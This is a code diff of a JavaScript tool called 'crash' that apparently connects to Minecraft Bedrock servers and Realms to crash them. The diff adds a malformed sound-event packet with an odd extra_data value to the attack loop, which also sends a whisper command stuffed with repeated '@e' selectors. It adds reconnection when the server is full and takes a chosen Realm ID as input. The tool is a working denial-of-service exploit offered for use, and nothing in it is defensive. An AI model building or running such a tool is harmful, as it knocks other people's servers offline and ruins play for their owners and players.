@@ -36,7 +36,7 @@ const crash = async (options, count = 3) => {
             this.lastCall = Date.now();
             await client.destroy;
             console.log(`${new Date().toLocaleTimeString()} > ${client.clients[0].profile.name} disconnected!`, data);
-            if (data === "server_id_conflict") await wait(3000);
+            if (data === "server_id_conflict" || data === "server_full") await wait(3000);
             await wait(5000);
             await run(count);
         }
@@ -70,7 +70,14 @@ const crash = async (options, count = 3) => {
                     entity_type: "minecraft:ender_dragon",
                     is_global: true,
                 });
-                // Add more levelSoundEvent calls as needed
+                levelSoundEvent(client, {
+                    sound_id: "BundleRemoveOne",
+                    entity_type: "",
+                    position: pos,
+                    is_global: true,
+                    extra_data: -1124852450,
+                    is_baby_mob: false,
+                });
                 runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
                 i++;
                 if (delay) await wait(options.delay);
@@ -141,7 +148,7 @@ api.getRealms().then(async (d) => {
             case "3":
                 console.log(`Enter Realm ID`);
                 const id = await cin();
-                (options.realms ??= {}).realmId = id;
+                (options.realms ??= {}).realmId = parseInt(id);
                 break;
             default:
                 console.log(`Invalid Input ${input} | Exiting...`);
